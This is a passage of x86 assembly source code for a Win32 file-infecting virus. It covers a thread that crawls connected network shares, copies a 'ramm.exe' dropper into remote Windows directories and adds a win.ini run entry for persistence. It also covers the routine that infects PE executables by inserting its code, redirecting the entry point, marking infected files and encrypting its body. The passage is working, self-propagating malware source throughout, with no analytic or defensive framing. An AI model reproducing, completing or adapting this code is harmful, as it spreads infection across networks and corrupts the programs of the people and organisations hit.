;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_6_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread6Delta                          ;
@Thread6Delta:                                     ;
       pop ebp                                     ;
       sub ebp, offset @Thread6Delta               ;
                                                   ;
       IF NETWORKINFECTION                         ;
       cmp [ebp+netapis], FALSE                    ;
       je exit_netcrawl                            ;
                                                   ;
       IF THREAD6SEH                               ;
       lea eax, [ebp+Thread6Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       call NetInfection C, 0                      ;
       jmp done_net                                ;
                                                   ;
NetInfection proc C lpnr:DWORD                     ;
                                                   ;
local lpnrLocal :DWORD                             ;
local hEnum     :DWORD                             ;
local ceEntries :DWORD                             ;
local cbBuffer  :DWORD                             ;
                                                   ;
       pusha                                       ;
       call get_new_delta                          ;
get_new_delta:                                     ;
       pop edx                                     ;
       sub edx, offset get_new_delta               ;
                                                   ;
       mov [ceEntries], 0FFFFFFFFh                 ;as many entries as poss.
       mov [cbBuffer], 4000                        ;memory buffer size
       lea eax, [hEnum]                            ;handle to enumeration
       mov esi, [lpnr]                             ;parameter
       call [edx+_WNetOpenEnumA], RESOURCE_CONNECTED,\ ;open the enumeration
                           RESOURCETYPE_ANY, 0,\   ;
                           esi, eax                ;
                                                   ;
       or eax, eax                                 ;failed?
       jnz exit_net                                ;
                                                   ;
       call [edx+_GlobalAlloc], GPTR, cbBuffer     ;allocate memory
       or eax, eax                                 ;
       jz exit_net                                 ;
       mov [lpnrLocal], eax                        ;save memory handle
                                                   ;
enumerate:                                         ;
       lea eax, cbBuffer                           ;enumerate all the
       push eax                                    ;resources
       mov esi, [lpnrLocal]                        ;
       push esi                                    ;
       lea eax, ceEntries                          ;
       push eax                                    ;
       push hEnum                                  ;
       call [edx+_WNetEnumResourceA]               ;
                                                   ;
       or eax, eax                                 ;failed?
       jnz free_mem                                ;
                                                   ;
       mov ecx, [ceEntries]                        ;how many entries?
       or ecx, ecx                                 ;
       jz enumerate                                ;
                                                   ;
roam_net:                                          ;
       push ecx esi                                ;
                                                   ;
       mov eax, [esi.dwType]                       ;is it a disk resource?
       test eax, RESOURCETYPE_DISK                 ;
       jz get_next_entry                           ;
                                                   ;
       mov edi, [esi.lpRemoteName]                 ;get remote name
       mov esi, [esi.lpLocalName]                  ;get local name
       or esi, esi                                 ;empty?
       jz no_good_name                             ;
                                                   ;
       cmp word ptr [esi],0041                     ;is it a floppy disk?
       jz no_good_name                             ;
                                                   ;
       call RemoteInfection                        ;try to infect it!
                                                   ;
no_good_name:                                      ;
       pop esi                                     ;
                                                   ;
       mov eax, [esi.dwUsage]                      ;do we have a container?
       test eax, RESOURCEUSAGE_CONTAINER           ;
       jz get_next_entry                           ;
                                                   ;
       push esi                                    ;
       call NetInfection                           ;recurse!!
                                                   ;
get_next_entry:                                    ;
       add esi, 20h                                ;next resource!
       pop ecx                                     ;
       loop roam_net                               ;
                                                   ;
       jmp enumerate                               ;and next enumeration...
                                                   ;
free_mem:                                          ;
       call [edx+_GlobalFree], [lpnrLocal]         ;free the memory
                                                   ;
       call [edx+_WNetCloseEnum], [hEnum]          ;and close enumeration.
                                                   ;
exit_net:                                          ;
       popa                                        ;
       ret                                         ;
NetInfection endp                                  ;
                                                   ;
RemoteInfection proc                               ;
       pusha                                       ;
       call @___1                                  ;restore the delta handle
@___1:                                             ;
       pop ebp                                     ;
       sub ebp, offset @___1                       ;
                                                   ;
       push 260                                    ;get the current file
       lea eax, [ebp+myname]                       ;name
       push eax                                    ;
       push 0                                      ;
       call [ebp+_GetModuleFileNameA]              ;
       or eax, eax                                 ;
       jz cannot_roam                              ;
                                                   ;
       lea esi, [ebp+windirs]                      ;point windows dir names
                                                   ;
test_paths:                                        ;
       lea ebx, [ebp+droppername]                  ;copy path for dropper
       call [ebp+_lstrcpy], ebx, edi               ;
       lea ebx, [ebp+winininame]                   ;copy path for win.ini
       call [ebp+_lstrcpy], ebx, edi               ;
                                                   ;
       lea ebx, [ebp+droppername]                  ;copy windows dir
       call [ebp+_lstrcat], ebx, esi               ;
       lea eax, [ebp+drop]                         ;and dropper name
       call [ebp+_lstrcat], ebx, eax               ;
                                                   ;
       push TRUE                                   ;now copy ourself over
       push ebx                                    ;the LAN under the new
       lea eax, [ebp+myname]                       ;name into the remote
       push eax                                    ;windows directory
       call [ebp+_CopyFileA]                       ;
       or eax, eax                                 ;
       jz test_next                                ;
                                                   ;
       lea ebx, [ebp+winininame]                   ;copy the windows dir name
       call [ebp+_lstrcat], ebx, esi               ;to the win.ini path
       lea eax, [ebp+winini]                       ;
       call [ebp+_lstrcat], ebx, eax               ;and it's name
                                                   ;
       lea eax, [ebp+winininame]                   ;Now create this entry
       push eax                                    ;into the win.ini file:
       lea eax, [ebp+droppername]                  ;
       push eax                                    ;[Windows]
       lea eax, [ebp+cmd]                          ;run=c:\windows\ramm.exe
       push eax                                    ;
       inc esi                                     ;
       push esi                                    ;
       call [ebp+_WritePrivateProfileStringA]      ;
       jmp cannot_roam                             ;
                                                   ;
test_next:                                         ;
       @endsz                                      ;go and try the next
       cmp byte ptr [esi], 0fh                     ;windows path!
       jne test_paths                              ;
                                                   ;
cannot_roam:                                       ;
       popa                                        ;
       ret                                         ;
                                                   ;
smash_dropper proc                                 ;this procedure acts like
       pusha                                       ;this:
       push 260                                    ;if the file ramm.exe
       call ramm_name                              ;exists in the windows dir
r_n:   db 260 dup(0)                               ;and there is no entry
ramm_name:                                         ;to run it at next boot
       call [ebp+_GetWindowsDirectoryA]            ;in the win.ini file, then
                                                   ;it will erase the file.
       lea edx, [ebp+r_n]                          ;if the file ramm.exe
       push edx                                    ;does not exist, but there
       call [ebp+_lstrlen]                         ;is an entry in the win
       mov edi, eax                                ;ini file, then it will
                                                   ;remove the entry.
       lea eax, [ebp+drop]                         ;If both are present
       push eax                                    ;they are left alone.
       lea edx, [ebp+r_n]                          ;
       push edx                                    ;
       call [ebp+_lstrcat]                         ;
                                                   ;
       lea eax, [ebp+W32FD]                        ;locate ramm.exe
       push eax                                    ;
       push edx                                    ;
       call [ebp+_FindFirstFileA]                  ;
       mov [ebp+ok], 0                             ;
       cmp eax, INVALID_HANDLE_VALUE               ;
       je no_file                                  ;
       mov [ebp+ok], 1                             ;
                                                   ;
no_file:                                           ;
       lea edx, [ebp+r_n]                          ;save name
       lea eax, [ebp+droppername]                  ;
       push edx                                    ;
       push eax                                    ;
       call [ebp+_lstrcpy]                         ;
                                                   ;
       mov byte ptr [edx+edi], 0                   ;
       lea eax, [ebp+winini]                       ;
       push eax                                    ;
       push edx                                    ;
       call [ebp+_lstrcat]                         ;
                                                   ;open win.ini
       push 0                                      ;
       push 0                                      ;
       push OPEN_EXISTING                          ;
       push 0                                      ;
       push 0                                      ;
       push GENERIC_READ + GENERIC_WRITE           ;
       push edx                                    ;
       call [ebp+_CreateFileA]                     ;
       inc eax                                     ;
       jz no_need                                  ;
       dec eax                                     ;
       mov [ebp+hfile], eax                        ;
                                                   ;
       push 0                                      ;
       push eax                                    ;
       call [ebp+_GetFileSize]                     ;
       mov [ebp+filesize], eax                     ;
                                                   ;
       push 0                                      ;
       push [ebp+filesize]                         ;
       push 0                                      ;
       push PAGE_READWRITE                         ;
       push 0                                      ;
       push [ebp+hfile]                            ;
       call [ebp+_CreateFileMappingA]              ;
                                                   ;
       or eax, eax                                 ;
       jz no_need_1                                ;
       mov [ebp+hmap], eax                         ;
                                                   ;
       push [ebp+filesize]                         ;
       push 0                                      ;
       push 0                                      ;
       push FILE_MAP_ALL_ACCESS                    ;
       push [ebp+hmap]                             ;
       call [ebp+_MapViewOfFile]                   ;
                                                   ;
       or eax, eax                                 ;
       jz no_need_2                                ;
       mov [ebp+haddress], eax                     ;
                                                   ;
       mov ecx, [ebp+filesize]                     ;
       sub ecx, 8                                  ;
                                                   ;
src_loop:                                          ;
       cmp dword ptr [eax]  , 'mmar'               ;search "ramm.exe"
       jne no_ramm                                 ;
       cmp dword ptr [eax+4], 'exe.'               ;
       je found_ramm                               ;
                                                   ;
no_ramm:                                           ;
       inc eax                                     ;
       loop src_loop                               ;
                                                   ;
       lea eax, [ebp+droppername]                  ;
       push eax                                    ;
       call [ebp+_DeleteFileA]                     ;
       jmp kill_memo                               ;
                                                   ;
found_ramm:                                        ;
       cmp [ebp+ok], 0                             ;
       jne kill_memo                               ;
                                                   ;
       mov edx, eax                                ;
       add edx, 8                                  ;
                                                   ;
rep_for_run:                                       ;
       cmp [eax], "=nur"                           ;search backwards for
       je finished_searching                       ;"run="
       dec eax                                     ;
       cmp eax, [ebp+haddress]                     ;
       je kill_memo                                ;
       jmp rep_for_run                             ;
                                                   ;
finished_searching:                                ;
       mov edi, eax                                ;put blanks over it!
       mov al, " "                                 ;
       mov ecx, edx                                ;
       sub ecx, edi                                ;
       rep stosb                                   ;
                                                   ;
kill_memo:                                         ;
       push [ebp+haddress]                         ;close win.ini!
       call [ebp+_UnmapViewOfFile]                 ;
                                                   ;
no_need_2:                                         ;
       push [ebp+hmap]                             ;
       call [ebp+_CloseHandle]                     ;
                                                   ;
no_need_1:                                         ;
       push [ebp+hfile]                            ;
       call [ebp+_CloseHandle]                     ;
                                                   ;
no_need:                                           ;
       popa                                        ;
       ret                                         ;
smash_dropper endp                                 ;
                                                   ;
windirs db "\Windows", 0                           ;
        db "\WinNT"  , 0                           ;
        db "\Win"    , 0                           ;
        db "\Win95"  , 0                           ;
        db "\Win98"  , 0                           ;
        db 0fh                                     ;
                                                   ;
winini  db "\Win.ini" , 0                          ;
drop    db "\ramm.exe", 0                          ;
cmd     db "run"      , 0                          ;
                                                   ;
myname      db 260 dup(0)                          ;
droppername db 260 dup(0)                          ;
winininame  db 260 dup(0)                          ;
RemoteInfection endp                               ;
                                                   ;
done_net:                                          ;
       IF THREAD6SEH                               ;
       jmp restore_thread6_seh                     ;host
                                                   ;
Thread6Exception:                                  ;if we had an error we
       mov esp, [esp+8]                            ;must restore the ESP
       call DeltaRecover6                          ;
DeltaRecover6:                                     ;
       pop ebp                                     ;
       sub ebp, offset DeltaRecover6               ;
                                                   ;
restore_thread6_seh:                               ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;
       ENDIF                                       ;
                                                   ;
       ENDIF                                       ;
                                                   ;
exit_netcrawl:                                     ;
       push 0                                      ;
       push 5                                      ;
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
       call [ebp+_ExitThread], 0                   ;
Thread_6_StartAddress endp                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
OurThreads dd offset Thread_1_StartAddress         ;
           dd offset Thread_2_StartAddress         ;
           dd offset Thread_3_StartAddress         ;
           dd offset Thread_4_StartAddress         ;
           dd offset Thread_5_StartAddress         ;
           dd offset Thread_6_StartAddress         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
ReturnToHost:                                      ;
       jmp restore_seh                             ;host
                                                   ;
ExceptionExit:                                     ;if we had an error we
       IF DEBUG                                    ;
          call MessageBoxA, 0, offset err, offset err, 0
          jmp go_over                              ;
          err db 'SEH Error!', 0                   ;
          go_over:                                 ;
       ELSE                                        ;
       ENDIF                                       ;
       mov esp, [esp+8]                            ;must restore the ESP
                                                   ;
restore_seh:                                       ;
       pop dword ptr fs:[0]                        ;and restore the SEH
       add esp, 4                                  ;returning to the host...
                                                   ;
       db 0BDh                                     ;restore delta handle
delta  dd 0                                        ;
                                                   ;
       cmp [ebp+firstgen], 1                       ;
       je generation0_exit                         ;
                                                   ;
       IF APIHOOK                                  ;if api hook is on we
apicheck:                                          ;cannot return to host
       cmp [ebp+apihookfinish], 1                  ;until the hooking is
       jne apicheck                                ;done...
       ENDIF                                       ;
                                                   ;
       mov eax, 12345678h                          ;mov eax, oledip
oldeip equ $-4                                     ;
       add eax, 12345678h                          ;add eax, imagebase
adjust equ $-4                                     ;
       mov dword ptr [ebp+savedeax], eax           ;
       popa                                        ;
                                                   ;
       push 12345678h                              ;
savedeax equ $-4                                   ;
       ret                                         ;
                                                   ;
generation0_exit:                                  ;
       push 0                                      ;
       call [ebp+_ExitProcess]                     ;
                                                   ;
InfectFile proc                                    ;
       pusha                                       ;save regs
       mov [ebp+flag], 1                           ;mark success flag
       mov [ebp+filename], edi                     ;save filename
       mov esi, edi                                ;
       call ValidateFile                           ;
       jc failed_infection                         ;
                                                   ;
       call [ebp+_GetFileAttributesA], edi         ;get attributes
       mov [ebp+fileattributes], eax               ;and save them
       call [ebp+_SetFileAttributesA], edi, FILE_ATTRIBUTE_NORMAL; and set
                                                   ;them normal
       call [ebp+_CreateFileA], edi, GENERIC_READ+GENERIC_WRITE, 0, 0,\
                         OPEN_EXISTING, 0, 0       ;open file
       cmp eax, INVALID_HANDLE_VALUE               ;
       je finished                                 ;
       mov [ebp+hfile], eax                        ;
                                                   ;
       mov [ebp+fileopen], TRUE                    ;
                                                   ;
       lea ebx, [ebp+filetime1]                    ;save file time
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       add ebx, 8                                  ;
       push ebx                                    ;
       call [ebp+_GetFileTime], eax                ;
                                                   ;
       call [ebp+_GetFileSize], [ebp+hfile], 0     ;get file size
       mov [ebp+filesize], eax                     ;
       add eax, virussize + 1000h                  ;
       mov [ebp+additional], eax                   ;save additional length
                                                   ;
       call [ebp+_CreateFileMappingA], [ebp+hfile], 0, PAGE_READWRITE,\
                                       0, [ebp+additional], 0
       or eax, eax                                 ;create mapping object
       je close_file                               ;
                                                   ;
       mov [ebp+hmap], eax                         ;
                                                   ;
       call [ebp+_MapViewOfFile], [ebp+hmap], FILE_MAP_ALL_ACCESS, 0, 0,\
                           [ebp+additional]        ;map file!
       or eax, eax                                 ;
       je close_map                                ;
                                                   ;
       mov [ebp+haddress], eax                     ;save address of mapping
       mov esi, eax                                ;
                                                   ;
       mov ax, word ptr [esi]                      ;check exe sign
       xor ax, '⁄ﬂ'                                ;
       cmp ax, 'ZM' xor '⁄ﬂ'                       ;
       jne close_address                           ;
                                                   ;
       call InitCopro                              ;check infection mark
       fild word ptr [esi.MZ_oeminfo]              ;this is number a
       fild word ptr [esi.MZ_oeminfo]              ;
       fmul                                        ;
       call RestoreCopro                           ;
       add esp, 4                                  ;
                                                   ;
       mov esi, [esi.MZ_lfanew]                    ;get pointer to pe header
       cmp esi, 1000h                              ;
       ja close_address                            ;
       add esi, [ebp+haddress]                     ;
                                                   ;
       call [ebp+_IsBadReadPtr], esi, 1000h        ;check readability
       or eax, eax                                 ;
       jnz close_address                           ;
                                                   ;
       mov [ebp+peheader], esi                     ;save pe header
                                                   ;
       mov ax, word ptr [esi]                      ;check if pe file
       xor ax, 'ı'                                ;
       cmp ax, 'EP' xor 'ı'                       ;
       jne close_address                           ;
                                                   ;
       test word ptr [esi.Characteristics], IMAGE_FILE_DLL; be sure it's not
       jnz close_address                           ;a library
                                                   ;
       lea edi, [ebp+pedata]                       ;
       xor eax, eax                                ;
       mov ax, [esi.NumberOfSections]              ;save number of sections
       stosd                                       ;
       mov ax, [esi.SizeOfOptionalHeader]          ;save optional header
       stosd                                       ;
       add esi, IMAGE_FILE_HEADER_SIZE             ;get to the optional head.
       mov [ebp+optionalheader], esi               ;
                                                   ;
       cmp word ptr [esi.OH_MajorImageVersion], 0  ;
       je skip_check                               ;
       cmp word ptr [esi.OH_MinorImageVersion], 0  ;
       je skip_check                               ;
       call InitCopro                              ;
       fild word ptr [esi.OH_MajorImageVersion]    ;this is number b
       fild word ptr [esi.OH_MajorImageVersion]    ;
       fmul                                        ;
       fild word ptr [esi.OH_MinorImageVersion]    ;this is number c
       fild word ptr [esi.OH_MinorImageVersion]    ;
       fmul                                        ;
       fadd                                        ;
       fsub                                        ;here is b^2+c^2-a^2
       fldz                                        ;is it 0?
       fcompp                                      ;compare them
       fstsw ax                                    ;get status word
       call RestoreCopro                           ;
       add esp, 4                                  ;
       sahf                                        ;load flags with it
       jz close_address                            ;is it already infected?
                                                   ;
skip_check:                                        ;
       cmp [esi.OH_Subsystem], IMAGE_SUBSYSTEM_NATIVE; check if it is not
       je close_address                            ;a driver...
                                                   ;
       mov eax, [esi.OH_AddressOfEntryPoint]       ;save entry eip
       stosd                                       ;
       mov eax, [esi.OH_ImageBase]                 ;imagebase
       stosd                                       ;
       mov eax, [esi.OH_SectionAlignment]          ;section align
       stosd                                       ;
       mov eax, [esi.OH_FileAlignment]             ;file align
       stosd                                       ;
       mov eax, [esi.OH_SizeOfImage]               ;size of image
       stosd                                       ;
       mov eax, [esi.OH_SizeOfHeaders]             ;headers size
       stosd                                       ;
       mov eax, [esi.OH_CheckSum]                  ;and checksum
       stosd                                       ;
       mov eax, [esi.OH_NumberOfRvaAndSizes]       ;save number of dirs..
       stosd                                       ;
       mov eax, [esi.OH_BaseOfCode]                ;and base of code
       stosd                                       ;
                                                   ;
       add esi, [ebp+sizeofoptionalheader]         ;mov to first sec header
       mov ecx, [ebp+numberofsections]             ;
                                                   ;
scan_for_code:                                     ;
       mov eax, [esi.SH_VirtualAddress]            ;get the RVA
       cmp eax, [ebp+baseofcode]                   ;is it the code section?
       jae found_code_section                      ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;no... get next...
       loop scan_for_code                          ;
       jmp close_address                           ;
                                                   ;
found_code_section:                                ;
       mov [ebp+codesectionheader], esi            ;save code section ptr
       mov [ebp+codesectionrva], eax               ;
       mov ebx, [esi.SH_PointerToRawData]          ;
       mov [ebp+codesectionraw], ebx               ;
       mov ebx, [esi.SH_VirtualSize]               ;
       mov eax, [esi.SH_SizeOfRawData]             ;
       call choose_smaller                         ;
       mov [ebp+codesectionsize], ebx              ;
                                                   ;
                                                   ;
       IF APIHOOK                                  ;
       pusha                                       ;
       mov esi, [ebp+optionalheader]               ;
       mov ecx, [ebp+numberofsections]             ;
       mov ebx, [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       or ebx, ebx                                 ;
       jz over_import                              ;
       add esi, [ebp+sizeofoptionalheader]         ;
                                                   ;
scan_for_imports:                                  ;
       mov eax, [esi.SH_VirtualAddress]            ;get the RVA
       cmp eax, ebx                                ;is it the import section?
       je found_import                             ;
       jb maybe_found                              ;
       jmp search_next_import                      ;
                                                   ;
maybe_found:                                       ;
       add eax, [esi.SH_VirtualSize]               ;
       cmp eax, ebx                                ;
       ja found_import                             ;
                                                   ;
search_next_import:                                ;
       add esi, IMAGE_SIZEOF_SECTION_HEADER        ;no... get next...
       loop scan_for_imports                       ;
       jmp no_import_found                         ;
                                                   ;
found_import:                                      ;enable write on the
       or [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE; imports, credits to
       mov [ebp+no_imports], TRUE                  ;Bumblebee for this.
       jmp over_import                             ;
                                                   ;
no_import_found:                                   ;
       mov [ebp+no_imports], FALSE                 ;
                                                   ;
over_import:                                       ;
       popa                                        ;
       ENDIF                                       ;
       call locate_last_section_stuff              ;locate stuff in the last
                                                   ;section
       call add_new_section                        ;add a new section
       jnc ok_go_with_it                           ;
                                                   ;
       call increase_last_section                  ;
       mov edi, [ebp+finaldestination]             ;
       jmp do_virus_movement                       ;
                                                   ;
ok_go_with_it:                                     ;
       mov eax, [esi.SH_SizeOfRawData]             ;get the 2 sizes and be
       cmp eax, virussize                          ;sure we are smaller then
       jb set_method_1                             ;both of them...
       mov eax, [esi.SH_VirtualSize]               ;
       cmp eax, virussize                          ;
       jb set_method_1                             ;
                                                   ;
size_is_ok:                                        ;
       cmp eax, virussize                          ;do we fit into the code
       jb set_method_1                             ;section?
                                                   ;
       mov [ebp+method], METHOD_MOVE_CODE          ;if yes, move the code...
                                                   ;
       mov ecx, 5                                  ;
                                                   ;
establish_home:                                    ;
       mov esi, [ebp+codesectionheader]            ;
       mov eax, [esi.SH_SizeOfRawData]             ;
       mov ebx, [esi.SH_VirtualSize]               ;
       call choose_smaller                         ;
       mov ebx, [esi.SH_PointerToRawData]          ;get pointer to data
       mov [ebp+codesectionraw], ebx               ;save it...
       mov esi, ebx                                ;get a delta difference
       IF RANDOMIZE_ENTRY                          ;
       sub eax, virussize                          ;to place us in and
       dec eax                                     ;randomize it...
       call brandom32                              ;
       ELSE                                        ;                                    ;
       mov eax, 1                                  ;
       ENDIF                                       ;
       mov [ebp+codedelta], eax                    ;from where we start?
                                                   ;
       call check_intersection                     ;are we intersecting with
       jnc continue_process                        ;other directories?
       loop establish_home                         ;if yes, try again!
                                                   ;
       jmp set_method_1                            ;if cannot find place move
                                                   ;at end!
                                                   ;
continue_process:                                  ;
       add esi, eax                                ;
       add esi, [ebp+haddress]                     ;
       push esi                                    ;
       mov edi, [ebp+last_section_destination]     ;save our destination...
       add edi, [ebp+haddress]                     ;
       call [ebp+_IsBadWritePtr], edi, virussize   ;can we write?
       or eax, eax                                 ;
       jnz close_address                           ;
       call move_virus_size                        ;move the original code
       pop edi                                     ;from here...
       mov [ebp+finaldestination], edi             ;save the destination of
                                                   ;code
do_virus_movement:                                 ;
       cmp [ebp+method], METHOD_INCREASE_LAST      ;
       jne not_increase_last                       ;
       mov eax, [ebp+last_section_destination]     ;
       sub eax, [ebp+lastsectionraw]               ;
       add eax, [ebp+lastsectionrva]               ;
       jmp set_it                                  ;
                                                   ;
not_increase_last:                                 ;
       cmp [ebp+method], METHOD_APPEND_AT_END      ;
       jne not_at_end                              ;
       mov eax, [ebp+lastsectionrva]               ;
       jmp set_it                                  ;
                                                   ;
not_at_end:                                        ;
       mov eax, [ebp+codesectionrva]               ;
       add eax, [ebp+codedelta]                    ;
                                                   ;
set_it:                                            ;
       add eax, (ourpoint-start)-1                 ;
       mov dword ptr [ebp+ourpoint+1], eax         ;for imagebase getter
                                                   ;
       mov eax, [ebp+last_section_destination]     ;here is a raw ptr in the
       sub eax, [ebp+lastsectionraw]               ;last section. Substract
       add eax, [ebp+lastsectionrva]               ;raw pointer and add virt
       mov dword ptr [ebp+codesource], eax         ;pointer to get a RVA
       mov eax, [ebp+finaldestination]             ;same crap on destination
       sub eax, [ebp+haddress]                     ;
       sub eax, [ebp+codesectionraw]               ;
       add eax, [ebp+codesectionrva]               ;
       mov dword ptr [ebp+codedestin], eax         ;
                                                   ;
       mov [ebp+copying], 1                        ;syncronization
       mov ecx, 100d                               ;
       loop $                                      ;
                                                   ;
       lea esi, [ebp+start]                        ;move virus now in the
       call move_virus_size                        ;code place...
       mov [ebp+copying], 0                        ;
                                                   ;
       mov eax, [ebp+addressofentrypoint]          ;save old eip
       mov edi, [ebp+finaldestination]             ;
       mov [edi+offset oldeip-offset start], eax   ;
                                                   ;
       mov esi, [ebp+codesectionheader]            ;
       or [esi.SH_Characteristics], IMAGE_SCN_MEM_WRITE+IMAGE_SCN_MEM_READ
       jmp continue                                ;make code writable
                                                   ;
set_method_1:                                      ;
       mov [ebp+method], METHOD_APPEND_AT_END      ;here we append the virus
                                                   ;at the end...
       mov edi, [ebp+last_section_destination]     ;
       add edi, [ebp+haddress]                     ;
       mov [ebp+finaldestination], edi             ;
       call [ebp+_IsBadWritePtr], edi, virussize   ;can we write?
       or eax, eax                                 ;
       jnz close_address                           ;
       jmp do_virus_movement                       ;
                                                   ;
continue:                                          ;
       call check_not                              ;check lists
       mov eax, [ebp+finaldestination]             ;
       add eax, (offset firstgen-offset start)     ;zero the first gen mark
       mov dword ptr [eax], 0                      ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;now align size of image
       mov eax, [ebp+sizeofimage]                  ;to the section alignment
       add eax, [ebp+newsize]                      ;
       cmp eax, [ebp+totalsizes]                   ;
       jb sizeofimage_ok                           ;
                                                   ;
       call align_to_sectionalign                  ;
       mov [esi.OH_SizeOfImage], eax               ;
                                                   ;
sizeofimage_ok:                                    ;
       mov eax, [ebp+filesize]                     ;align the filesize to
       add eax, [ebp+newsize]                      ;the file alignment
       call align_to_filealign                     ;
       mov [ebp+filesize], eax                     ;
                                                   ;
       cmp [ebp+method], METHOD_APPEND_AT_END      ;
       je alternate                                ;
       cmp [ebp+method], METHOD_INCREASE_LAST      ;
       je alternate2                               ;
       mov eax, [ebp+finaldestination]             ;get our final destination
       sub eax, [ebp+haddress]                     ;substract current map
       sub eax, [ebp+codesectionraw]               ;
       add eax, [ebp+codesectionrva]               ;
       jmp set_eip                                 ;
                                                   ;
alternate2:                                        ;
       pusha                                       ;
       mov esi, [ebp+lastsectionheader]            ;
       mov eax, [esi.SH_VirtualSize]               ;
       xchg eax, [esi.SH_SizeOfRawData]            ;
       mov [esi.SH_VirtualSize], eax               ;
       popa                                        ;
                                                   ;
       mov eax, [ebp+last_section_destination]     ;
       sub eax, [ebp+lastsectionraw]               ;
       add eax, [ebp+lastsectionrva]               ;
       call EPO_Routine                            ;
       jnc set_epo                                 ;
       jmp set_eip                                 ;
                                                   ;
alternate:                                         ;
       mov eax, [ebp+lastsectionrva]               ;
       call EPO_Routine                            ;
       jnc set_epo                                 ;
       jmp set_eip                                 ;
                                                   ;
set_epo:                                           ;
       pusha                                       ;
       mov ebx, [ebp+addressofentrypoint]          ;
       mov edx, ebx                                ;
       add ebx, [ebp+codesectionraw]               ;
       sub ebx, [ebp+codesectionrva]               ;
       add ebx, [ebp+haddress]                     ;
       sub eax, edx                                ;
       sub eax, 5                                  ;
       mov edx, dword ptr [ebx]                    ;
       mov ecx, dword ptr [ebx+4]                  ;
       mov byte ptr [ebx], 0e9h                    ;
       mov dword ptr [ebx+1], eax                  ;
       mov eax, [ebp+finaldestination]             ;
       add eax, (offset saved_code-offset start)   ;
       mov [eax], edx                              ;
       mov [eax+4], ecx                            ;
       popa                                        ;
       jmp mark_infection                          ;
                                                   ;
set_eip:                                           ;
       mov [esi.OH_AddressOfEntryPoint], eax       ;address and save eip RVA
                                                   ;
mark_infection:                                    ;
       mov eax, 100d                               ;get random pythagora's
       call brandom32                              ;numbers roots
       mov word ptr [ebp+m], ax                    ;m
       mov eax, 100d                               ;
       call brandom32                              ;
       mov word ptr [ebp+n], ax                    ;n
                                                   ;
       call InitCopro                              ;
       fild word ptr [ebp+n]                       ;load the root numbers
       fild word ptr [ebp+m]                       ;
       fild word ptr [ebp+n]                       ;
       fild word ptr [ebp+m]                       ;
       fmul st, st(2)                              ;M*M
       fincstp                                     ;
       fmul st, st(2)                              ;N*N
       fdecstp                                     ;
       fadd st, st(1)                              ;M*M + N*N
       fist word ptr [ebp+a]                       ;store it to a
       fsub st, st(1)                              ;
       fsub st, st(1)                              ;
       fabs                                        ;|M*M - N*N|
       fist word ptr [ebp+c]                       ;store it to c
       fincstp                                     ;
       fincstp                                     ;
       fmul                                        ;
       fimul word ptr [ebp+two]                    ;2*M*N
       fist word ptr [ebp+b]                       ;store it to b
       call RestoreCopro                           ;Now a^2 = b^2 + c^2
       add esp, 4                                  ;
                                                   ;
       push esi                                    ;mark infection!
       mov esi, [ebp+haddress]                     ;
       mov ax, [ebp+a]                             ;
       mov word ptr [esi.MZ_oeminfo], ax           ;
       mov ax, [ebp+b]                             ;
       pop esi                                     ;
       mov word ptr [esi.OH_MajorImageVersion], ax ;
       mov ax, [ebp+c]                             ;
       mov word ptr [esi.OH_MinorImageVersion], ax ;
                                                   ;
       mov eax, [ebp+sizeofheaders]                ;rearrange size of headers
       mov [esi.OH_SizeOfHeaders], eax             ;
                                                   ;
       mov esi, [ebp+peheader]                     ;
                                                   ;
       cmp [ebp+method], METHOD_INCREASE_LAST      ;
       je no_need_to_increase                      ;
       inc word ptr [esi.NumberOfSections]         ;
                                                   ;
no_need_to_increase:                               ;
       IF CHECKSUM                                 ;
       mov eax, [esi.OH_CheckSum]                  ;
       or eax, eax                                 ;
       jz no_checksum                              ;
                                                   ;
       mov ebx, [ebp+checksumfile]                 ;
       or ebx, ebx                                 ;
       jz no_checksum                              ;
                                                   ;
       mov esi, [ebp+optionalheader]               ;
       mov eax, [esi.OH_CheckSum]                  ;
       or eax, eax                                 ;
       jz no_checksum                              ;
       lea eax, [esi.OH_CheckSum]                  ;
       push eax                                    ;
       lea eax, [ebp+offset headersum]             ;
       push eax                                    ;
       push [ebp+filesize]                         ;
       push [ebp+haddress]                         ;
       call ebx                                    ;
       ELSE                                        ;
       mov esi, [ebp+optionalheader]               ;
       xor eax, eax                                ;
       mov [esi.OH_CheckSum], eax                  ;
       ENDIF                                       ;
                                                   ;
no_checksum:                                       ;
       mov esi, [ebp+finaldestination]             ;our internal encryptor
       add esi, (EncryptedArea - start)            ;
       mov edi, esi                                ;
       mov ecx, (end2-EncryptedArea)               ;
                                                   ;
EncryptLoop:                                       ;
       lodsb                                       ;
       mov ebx, ecx                                ;
       inc bl                                      ;
       jp _parity                                  ;
       rol al, cl                                  ;
       jmp do_encrypt                              ;
                                                   ;
_parity:                                           ;
       ror al, cl                                  ;
                                                   ;
do_encrypt:                                        ;
       stosb                                       ;
       loop EncryptLoop                            ;
                                                   ;
       jmp infection_succesfull                    ;success!!! ;-)
                                                   ;
